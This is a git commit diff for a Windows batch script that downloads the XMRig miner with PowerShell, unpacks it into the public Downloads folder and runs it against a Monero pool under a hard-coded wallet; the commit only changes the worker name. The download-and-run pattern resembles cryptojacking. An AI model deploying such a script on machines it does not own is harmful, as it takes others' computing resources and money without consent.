a33a5407c361d4fd93aa8bc915f391f4d7d2eb8b
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-02-22 16:16:53 -0300

    Update run4.bat

--- run4.bat
+++ run4.bat
@@ -1,3 +1,3 @@
 powershell Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-gcc-win64.zip" -OutFile "C:\Users\Public\Downloads\xmrig.zip"
 powershell Expand-Archive -LiteralPath C:\Users\Public\Downloads\xmrig.zip -DestinationPath C:\Users\Public\Downloads
-C:\Users\Public\Downloads\xmrig-6.18.1\xmrig.exe --coin=XMR -o pool.supportxmr.com:3333 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.Supp1 -p x -t 6
+C:\Users\Public\Downloads\xmrig-6.18.1\xmrig.exe --coin=XMR -o pool.supportxmr.com:3333 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.Supp2 -p x -t 6
